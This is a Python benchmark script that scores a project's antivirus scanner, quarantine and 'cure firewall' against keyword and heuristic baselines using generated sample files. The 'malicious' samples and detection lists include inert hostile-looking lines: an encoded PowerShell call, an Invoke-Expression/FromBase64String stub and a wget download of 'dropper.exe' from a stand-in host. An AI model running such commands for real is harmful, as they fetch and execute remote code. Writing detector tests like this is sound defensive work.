from __future__ import annotations

import argparse
import json
import random
import shutil
import string
import sys
import tempfile
import time
from datetime import datetime, timezone
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
SRC = ROOT / "src"
if str(SRC) not in sys.path:
    sys.path.insert(0, str(SRC))

from zero_os.antivirus import quarantine_file, quarantine_restore, scan_target
from zero_os.cure_firewall import run_cure_firewall, verify_beacon


def _utc_now() -> str:
    return datetime.now(timezone.utc).isoformat()


def _write(path: Path, text: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


def _make_clean_text(seed: int, n: int = 200) -> str:
    rng = random.Random(seed)
    alphabet = string.ascii_letters + string.digits + " \n"
    return "".join(rng.choice(alphabet) for _ in range(n))


def _setup_dataset(base: Path, clean_count: int, malicious_count: int, seed: int) -> tuple[dict, dict]:
    samples = {"clean": [], "malicious": []}
    manifest = {"version": 1, "seed": int(seed), "clean_samples": [], "malicious_samples": []}
    clean_dir = base / "dataset" / "clean"
    bad_dir = base / "dataset" / "malicious"
    clean_dir.mkdir(parents=True, exist_ok=True)
    bad_dir.mkdir(parents=True, exist_ok=True)

    for i in range(clean_count):
        p = clean_dir / f"clean_{i:03d}.txt"
        sample_seed = int(seed) + i
        _write(p, _make_clean_text(sample_seed))
        rel = str(p.relative_to(base)).replace("\\", "/")
        samples["clean"].append(rel)
        manifest["clean_samples"].append({"path": rel, "seed": sample_seed})

    malicious_payloads = [
        "powershell -enc AAAA\nquantum-virus-signature\n",
        "EICAR-STANDARD-ANTIVIRUS-TEST-FILE",
        "Invoke-Expression (FromBase64String('QQ=='))",
        "wget http://bad.example/dropper.exe",
    ]
    for i in range(malicious_count):
        p = bad_dir / f"bad_{i:03d}.ps1"
        payload = malicious_payloads[i % len(malicious_payloads)] + f"\n# sample {i}\n"
        _write(p, payload)
        rel = str(p.relative_to(base)).replace("\\", "/")
        samples["malicious"].append(rel)
        manifest["malicious_samples"].append({"path": rel, "payload_template_index": i % len(malicious_payloads)})

    return samples, manifest


def _baseline_scan(base: Path, samples: dict, mode: str) -> dict:
    keywords_map = {
        "keyword_baseline": ["quantum-virus-signature", "eicar-standard-antivirus-test-file", "powershell -enc"],
        "heuristic_baseline": [
            "frombase64string(",
            "invoke-expression",
            "wget http",
            "powershell -enc",
            "quantum-virus-signature",
        ],
    }
    needles = keywords_map.get(mode, [])
    found = set()
    for rel in samples["clean"] + samples["malicious"]:
        p = base / rel
        text = p.read_text(encoding="utf-8", errors="ignore").lower()
        if any(x in text for x in needles):
            found.add(rel)
    tp = sum(1 for p in samples["malicious"] if p in found)
    fp = sum(1 for p in samples["clean"] if p in found)
    fn = max(0, len(samples["malicious"]) - tp)
    tn = max(0, len(samples["clean"]) - fp)
    return {
        "mode": mode,
        "true_positive": tp,
        "false_positive": fp,
        "false_negative": fn,
        "true_negative": tn,
        "tp_rate": round(tp / max(1, len(samples["malicious"])), 4),
        "fp_rate": round(fp / max(1, len(samples["clean"])), 4),
    }


def run_benchmark(clean_count: int = 80, malicious_count: int = 20, iterations: int = 3, seed: int = 1337, preset: str = "medium") -> dict:
    if clean_count < 1 or malicious_count < 1 or iterations < 1:
        raise ValueError("clean_count, malicious_count, and iterations must be >= 1")

    workdir = Path(tempfile.mkdtemp(prefix="zero_security_bench_"))
    try:
        samples, manifest = _setup_dataset(workdir, clean_count=clean_count, malicious_count=malicious_count, seed=seed)
        per_iter = []
        target = str((workdir / "dataset").resolve())

        for i in range(iterations):
            t0 = time.perf_counter()
            report = scan_target(str(workdir), target)
            elapsed = time.perf_counter() - t0

            found = {str(x.get("path", "")) for x in report.get("findings", [])}
            tp = sum(1 for p in samples["malicious"] if p in found)
            fp = sum(1 for p in samples["clean"] if p in found)
            fn = max(0, len(samples["malicious"]) - tp)
            tn = max(0, len(samples["clean"]) - fp)
            throughput = report.get("scanned_files", 0) / max(elapsed, 1e-9)

            per_iter.append(
                {
                    "iteration": i + 1,
                    "scan_seconds": round(elapsed, 6),
                    "scanned_files": int(report.get("scanned_files", 0)),
                    "true_positive": tp,
                    "false_positive": fp,
                    "false_negative": fn,
                    "true_negative": tn,
                    "throughput_files_per_sec": round(float(throughput), 2),
                    "highest_severity": report.get("highest_severity", "low"),
                }
            )

        avg = {
            "scan_seconds": round(sum(x["scan_seconds"] for x in per_iter) / iterations, 6),
            "throughput_files_per_sec": round(sum(x["throughput_files_per_sec"] for x in per_iter) / iterations, 2),
            "tp_rate": round(sum(x["true_positive"] for x in per_iter) / (iterations * malicious_count), 4),
            "fp_rate": round(sum(x["false_positive"] for x in per_iter) / (iterations * clean_count), 4),
        }

        # Quarantine + restore reliability benchmark.
        q_target = samples["malicious"][0]
        q = quarantine_file(str(workdir), q_target, reason="benchmark")
        restore_ok = False
        if q.get("ok"):
            rid = str(q.get("id", ""))
            restore = quarantine_restore(str(workdir), rid)
            restore_ok = bool(restore.get("ok"))

        # Cure firewall survivability benchmark.
        cure_file = workdir / "dataset" / "malicious" / "cure_target.py"
        _write(
            cure_file,
            "def payload():\n    return 'quantum-virus-signature|entangle'\n",
        )
        ct0 = time.perf_counter()
        cure = run_cure_firewall(str(workdir), "dataset/malicious/cure_target.py", pressure=95)
        cure_elapsed = time.perf_counter() - ct0
        beacon_ok, beacon_reason = verify_beacon(str(workdir), "dataset/malicious/cure_target.py")

        baseline_keyword = _baseline_scan(workdir, samples, mode="keyword_baseline")
        baseline_heur = _baseline_scan(workdir, samples, mode="heuristic_baseline")

        return {
            "generated_utc": _utc_now(),
            "config": {
                "preset": preset,
                "seed": int(seed),
                "clean_count": clean_count,
                "malicious_count": malicious_count,
                "iterations": iterations,
            },
            "dataset_manifest": manifest,
            "av_scan": {"iterations": per_iter, "avg": avg},
            "baseline_comparison": {
                "keyword_baseline": baseline_keyword,
                "heuristic_baseline": baseline_heur,
                "delta_vs_keyword": {
                    "tp_rate_gain": round(avg["tp_rate"] - baseline_keyword["tp_rate"], 4),
                    "fp_rate_reduction": round(baseline_keyword["fp_rate"] - avg["fp_rate"], 4),
                },
                "delta_vs_heuristic": {
                    "tp_rate_gain": round(avg["tp_rate"] - baseline_heur["tp_rate"], 4),
                    "fp_rate_reduction": round(baseline_heur["fp_rate"] - avg["fp_rate"], 4),
                },
            },
            "quarantine_restore": {"quarantine_ok": bool(q.get("ok", False)), "restore_ok": restore_ok},
            "cure_firewall": {
                "activated": bool(cure.activated),
                "survived": bool(cure.survived),
                "score": int(cure.score),
                "run_seconds": round(cure_elapsed, 6),
                "beacon_verify_ok": bool(beacon_ok),
                "beacon_verify_reason": beacon_reason,
            },
            "summary": {
                "antivirus_detection_rate": avg["tp_rate"],
                "antivirus_false_positive_rate": avg["fp_rate"],
                "quarantine_restore_reliable": bool(q.get("ok", False) and restore_ok),
                "cure_firewall_beacon_verified": bool(beacon_ok),
            },
        }
    finally:
        shutil.rmtree(workdir, ignore_errors=True)


def _to_markdown(result: dict) -> str:
    s = result["summary"]
    a = result["av_scan"]["avg"]
    q = result["quarantine_restore"]
    c = result["cure_firewall"]
    b = result["baseline_comparison"]
    return "\n".join(
        [
            "# Security Stack Benchmark",
            "",
            f"- Generated UTC: {result['generated_utc']}",
            (
                f"- Config: preset={result['config']['preset']}, seed={result['config']['seed']}, "
                f"clean={result['config']['clean_count']}, malicious={result['config']['malicious_count']}, "
                f"iterations={result['config']['iterations']}"
            ),
            "",
            "## Summary",
            f"- Antivirus detection rate: {s['antivirus_detection_rate']:.4f}",
            f"- Antivirus false positive rate: {s['antivirus_false_positive_rate']:.4f}",
            f"- Avg scan seconds: {a['scan_seconds']}",
            f"- Avg throughput files/sec: {a['throughput_files_per_sec']}",
            f"- Quarantine restore reliable: {q['quarantine_ok'] and q['restore_ok']}",
            f"- Cure firewall survived: {c['survived']} (score={c['score']}, run_seconds={c['run_seconds']})",
            f"- Cure firewall beacon verified: {c['beacon_verify_ok']} ({c['beacon_verify_reason']})",
            "",
            "## Baseline Comparison",
            f"- Keyword baseline TP/FP: {b['keyword_baseline']['tp_rate']:.4f} / {b['keyword_baseline']['fp_rate']:.4f}",
            f"- Heuristic baseline TP/FP: {b['heuristic_baseline']['tp_rate']:.4f} / {b['heuristic_baseline']['fp_rate']:.4f}",
            f"- Delta vs keyword (TP gain / FP reduction): {b['delta_vs_keyword']['tp_rate_gain']:.4f} / {b['delta_vs_keyword']['fp_rate_reduction']:.4f}",
            f"- Delta vs heuristic (TP gain / FP reduction): {b['delta_vs_heuristic']['tp_rate_gain']:.4f} / {b['delta_vs_heuristic']['fp_rate_reduction']:.4f}",
            "",
        ]
    )


def _preset_config(name: str) -> tuple[int, int, int]:
    n = name.strip().lower()
    if n == "small":
        return (60, 20, 3)
    if n == "large":
        return (800, 200, 5)
    return (200, 60, 4)


def main() -> int:
    parser = argparse.ArgumentParser(description="Repeatable security benchmark for antivirus + cure firewall.")
    parser.add_argument("--preset", choices=["small", "medium", "large"], default="medium")
    parser.add_argument("--seed", type=int, default=1337)
    args = parser.parse_args()

    clean_count, malicious_count, iterations = _preset_config(args.preset)
    result = run_benchmark(
        clean_count=clean_count,
        malicious_count=malicious_count,
        iterations=iterations,
        seed=int(args.seed),
        preset=args.preset,
    )
    out_dir = ROOT / "security" / "artifacts"
    out_dir.mkdir(parents=True, exist_ok=True)
    json_path = out_dir / "security_benchmark.json"
    md_path = out_dir / "security_benchmark.md"
    manifest_path = ROOT / "security" / "benchmarks" / "dataset_manifest_v1.json"
    json_path.write_text(json.dumps(result, indent=2) + "\n", encoding="utf-8")
    md_path.write_text(_to_markdown(result), encoding="utf-8")
    manifest_path.parent.mkdir(parents=True, exist_ok=True)
    manifest_path.write_text(json.dumps(result["dataset_manifest"], indent=2) + "\n", encoding="utf-8")
    print(f"Benchmark written: {json_path}")
    print(f"Benchmark written: {md_path}")
    print(f"Dataset manifest written: {manifest_path}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
